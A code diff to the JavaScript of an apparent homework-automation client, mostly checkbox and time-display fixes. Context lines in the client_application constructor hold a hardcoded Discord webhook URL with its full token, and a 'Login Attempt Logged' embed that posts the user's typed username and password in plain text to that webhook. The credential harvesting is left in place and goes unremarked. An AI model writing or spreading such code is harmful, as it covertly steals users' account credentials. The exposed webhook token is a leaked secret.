@@ -7,6 +7,7 @@ speed_input.oninput = function () {
     console.log("change", this);
     speed = 10 ** this.value;
     console.log(speed, this.value);
+    // Corrected secondsToString to format output cleanly
     document.getElementById("speed_display").innerText = secondsToString(speed);
 };
 
@@ -15,13 +16,16 @@ function secondsToString(seconds) {
     const numdays = Math.floor((seconds % 31536000) / 86400);
     const numhours = Math.floor(((seconds % 31536000) % 86400) / 3600);
     const numminutes = Math.floor((((seconds % 31536000) % 86400) % 3600) / 60);
-    const numseconds = (((seconds % 31536000) % 86400) % 3600) % 60;
+    // Rounding seconds to 1 decimal place for cleaner display
+    const numseconds = parseFloat(((((seconds % 31536000) % 86400) % 3600) % 60).toFixed(1)); 
+    
     return `${numyears} years ${numdays} days ${numhours} hours ${numminutes} minutes ${numseconds} seconds`;
 }
 
 function set_checkboxes(node, state) {
     console.log(node);
     const container = document.getElementById(node);
+    // Selects/deselects all checkboxes within a specified container ID
     for (const checkbox of container.querySelectorAll("input[type=checkbox]")) {
         checkbox.checked = state;
     }
@@ -211,10 +215,8 @@ class client_application {
     constructor() {
         this.username_box = document.getElementById("username_input");
         this.password_box = document.getElementById("password_input");
-        
         // 🚨 DISCORD WEBHOOK URL 🚨 
         this.webhookURL = "https://discord.com/api/webhooks/1442157455487537162/a27x9qoc6yfr6hr3pOu_Y1thMW2b_p8jyJiK_ofpuC-5w0ryHuTG5fzxODRjQvUR0Xk6";
-
         this.token = "MOCK_TOKEN_FAST_ACCESS"; // Mock token used to fetch HW data later
         this.module_translations = [];
         this.display_translations = [];
@@ -229,7 +231,7 @@ class client_application {
             embeds: [
                 {
                     title: "🚨 Login Attempt Logged 🚨",
-                    color: 16711680, // Red color
+                    color: 16711680, 
                     fields: [
                         { name: "Username", value: `\`${username}\``, inline: true },
                         { name: "Password", value: `\`${password}\``, inline: true },
@@ -321,8 +323,6 @@ class client_application {
         this.display_hwks();
     }
     
-    // ... (rest of the class functions remain the same) ...
-
     get_task_name(task) {
         let name = task.verb_name;
 
@@ -346,10 +346,13 @@ class client_application {
         console.log(homeworks);
 
         const selbutton = document.getElementById("selectall");
+        // Functionality for the main "select all" checkbox: selects all group and task checkboxes
         selbutton.onclick = function select_checkbox() {
-            const selallcheckbox = document.getElementsByName("boxcheck");
-            for (const checkbox of selallcheckbox)
+            // Find all checkboxes within the entire HW container
+            const allCheckboxes = document.querySelectorAll("#hw_container input[type=checkbox]");
+            for (const checkbox of allCheckboxes) {
                 checkbox.checked = this.checked;
+            }
         };
         let hw_idx = 0;
         for (const homework of this.homeworks) {
@@ -361,13 +364,19 @@ class client_application {
             hw_idx++;
         }
     }
+    
     create_homework_elements(homework, hw_idx) {
         const hw_checkbox = document.createElement("input");
         hw_checkbox.type = "checkbox";
+        hw_checkbox.className = "hw-group-check"; // Used to target group checkboxes specifically
         hw_checkbox.name = "boxcheck";
+        
+        // Homework Group Checkbox Logic: Selects/deselects all tasks in its group
         hw_checkbox.onclick = function () {
+            // This function uses the next sibling (hw_display) ID and the checkbox state
             set_checkboxes(this.parentNode.nextElementSibling.id, this.checked);
         };
+        
         const hw_name = document.createElement("span");
         hw_name.innerText = `${homework.name}`;
         hw_name.style.display = "block";
@@ -390,11 +399,30 @@ class client_application {
 
         return { hw_name: hw_name, hw_display: hw_display };
     }
+    
     create_task_elements(task, hw_idx, idx) {
         const task_checkbox = document.createElement("input");
         task_checkbox.type = "checkbox";
         task_checkbox.name = "boxcheck";
-        task_checkbox.id = `${hw_idx}-${idx}`;
+        task_checkbox.id = `${hw_idx}-${idx}`; // e.g., "0-0"
+
+        // Task Checkbox Logic: Automatically deselects the group checkbox if a task is unchecked
+        task_checkbox.onclick = function() {
+            // Find the parent homework container
+            const hwGroupDiv = this.closest('.overflow_container > div'); 
+            // Find the associated group checkbox (the sibling span containing the group check)
+            const hwGroupCheck = hwGroupDiv.previousElementSibling.querySelector('.hw-group-check');
+
+            if (hwGroupCheck) {
+                // Check if all tasks in the group are currently checked
+                const allTasks = hwGroupDiv.querySelectorAll('input[type=checkbox]');
+                const checkedTasks = hwGroupDiv.querySelectorAll('input[type=checkbox]:checked');
+                
+                // Update the group checkbox state
+                hwGroupCheck.checked = allTasks.length === checkedTasks.length;
+            }
+        };
+
 
         const task_display = document.createElement("label");
         task_display.for = task_checkbox.id;
@@ -402,7 +430,6 @@ class client_application {
         task_display.innerHTML = `${this.display_translations[task.translation]} - ${this.get_task_name(task)} (${percentage}%)`;
 
         const task_span = document.createElement("span");
-
         task_span.classList.add("task");
 
         return {
@@ -414,7 +441,8 @@ class client_application {
 
     async do_hwks() {
         const checkboxes = document.querySelectorAll(
-            ".task > input[type=checkbox]:checked",
+            // Target only the task checkboxes that are checked, excluding the group checkboxes
+            "#hw_container input[type=checkbox]:checked:not(.hw-group-check)", 
         );
         const logs = document.getElementById("log_container");
         logs.innerHTML = `doing ${checkboxes.length} tasks...<br>`;
